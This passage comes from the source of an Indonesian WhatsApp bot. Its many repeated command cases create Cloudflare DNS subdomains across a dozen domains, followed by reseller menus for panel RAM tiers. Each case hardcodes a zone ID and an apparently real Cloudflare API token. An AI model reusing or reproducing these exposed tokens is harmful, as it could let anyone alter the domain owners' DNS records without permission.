                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd56': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "edf8e5a66859e6a1f8ccbde07c415082";
               let apitoken = "p0gm6UzsPw0Y0eudhfDr1ZBvV_WjX9eMpTp4ksXZ"
               let tld = "didindev.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd57': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "030c4af3a1a8e92bc3588ac2299ed43a";
               let apitoken = "4rLCTnbktVWjsYWfFoirZv40Aqau8i1EhfHW-lIk"
               let tld = "panelstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd58': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f121b6997da209f413cccfbe14ab87a5";
               let apitoken = "SNwPfp0Chd5aCf_d3PxtDdyBtovvUcV6L-JY2kYf"
               let tld = "yasshost.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd86': {
        if (!isOwner) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a052afcd1f2873020a89257182feb608";
               let apitoken = "9be2dab811cd3cc6a6e7a7467166155e"
               let tld = "onlinehostt.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd87': {
        if (!isOwner) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "1f442378de0df0e70127c65e4075017c";
               let apitoken = "FRp9Ib-pfTg67cllUnvMU4bmNRgFJfJJaxlabYRe"
               let tld = "panel-tamzdev.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd88': {
        if (!isOwner && !isPremium) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "11d2b0d7530d8e7ad402add6a48af1ff";
               let apitoken = "tRlspCybESG4WKe2DmKwCgknTW7-o6DttTzi4tcz"
               let tld = "xstxyro.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd89': {
        if (!isOwner && !isPremium) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "938ad9f996e24d29fb68487ceb459a53";
               let apitoken = "W2FlBUoiwDMWUXSpRc2C3ZBNK8aKu_8hf47fJQwd"
               let tld = "store-panel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd76': {
        if (!isOwner && !isPremium) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb953c98b23bc7619f0e54701db07878";
               let apitoken = "ycq92Hz_KkhfnVPp-Zo83AtKIUaErg1UmkHRckm-"
               let tld = "xmartpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd59': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4181daaa4a105c9b2b9be81dd85b42f7";
               let apitoken = "np1WPiPMLnFxgUvNL_5-HMd7YvlhumpqNVtugDyX"
               let tld = "diimz.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd83': {
if (!isOwner && !isPremium) return ('Khusu Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "84d35b1efa4fcdd32825bc887e83ba0c";
               let apitoken = "Ymf8GMTJO7AGeyMTFzoDx3d3vgW_FBiqL78b9O_S"
               let tld = "panellstore.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd60': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "A4E0OuHCDuUy09QCENX2t6suDS5EIIi3urJO101r"
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break  

           
case 'd61': {
if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "eb6a14586a737768de8eb75e417be305";
               let apitoken = "WG-rSvje9yH9EXKyMZqyBP8yUtpWmUoQmsoxfpnO";
               let tld = "ruztanxd.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━
*pt pt yuk biar bnyak domain nye*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case "ramlist": {
const text12 = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`RESELLER MENU\`
┋░▹ ${global.simbol} ${prefix}1gb *nama,number*
┋░▹ ${global.simbol} ${prefix}2gb *nama,number*
┋░▹ ${global.simbol} ${prefix}3gb *nama,number*
┋░▹ ${global.simbol} ${prefix}4gb *nama,number*
┋░▹ ${global.simbol} ${prefix}5gb *nama,number*
┋░▹ ${global.simbol} ${prefix}6gb *nama,number*
┋░▹ ${global.simbol} ${prefix}7gb *nama,number*
┋░▹ ${global.simbol} ${prefix}8gb *nama,number*
┋░▹ ${global.simbol} ${prefix}9gb *nama,number*
┋░▹ ${global.simbol} ${prefix}10gb *nama,number*
┋░▹ ${global.simbol} ${prefix}11gb *nama,number*
┋░▹ ${global.simbol} ${prefix}12gb *nama,number*
┋░▹ ${global.simbol} ${prefix}13gb *nama,number*
┋░▹ ${global.simbol} ${prefix}14gb *nama,number*
┋░▹ ${global.simbol} ${prefix}15gb *nama,number*
┋░▹ ${global.simbol} ${prefix}16gb *nama,number*
┋░▹ ${global.simbol} ${prefix}17gb *nama,number*
┋░▹ ${global.simbol} ${prefix}18gb *nama,number*
┋░▹ ${global.simbol} ${prefix}19gb *nama,number*
┋░▹ ${global.simbol} ${prefix}20gb *nama,number*
┋░▹ ${global.simbol} ${prefix}21gb *nama,number*
┋░▹ ${global.simbol} ${prefix}22gb *nama,number*
┋░▹ ${global.simbol} ${prefix}23gb *nama,number*
┋░▹ ${global.simbol} ${prefix}24gb *nama,number*
┋░▹ ${global.simbol} ${prefix}25gb *nama,number*
┋░▹ ${global.simbol} ${prefix}unli *nama,number*
┗━━━━━━━━━━━━━━━━━━`
tamzz.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'MikkuBot',
thumbnailUrl: 'https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg',
sourceUrl: "https://chat.whatsapp.com/IAvxLU8KWknAYJngDXOctu",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: qpayment})
}
break
case "ramlist1": {
const text12 = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`RESELLER PRIVATE MENU\`
┋░▹ ${global.simbol} ${prefix}1gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}2gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}3gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}4gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}5gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}6gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}7gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}8gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}9gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}10gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}11gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}12gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}13gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}14gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}15gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}16gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}17gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}18gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}19gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}20gbb *nama,number*
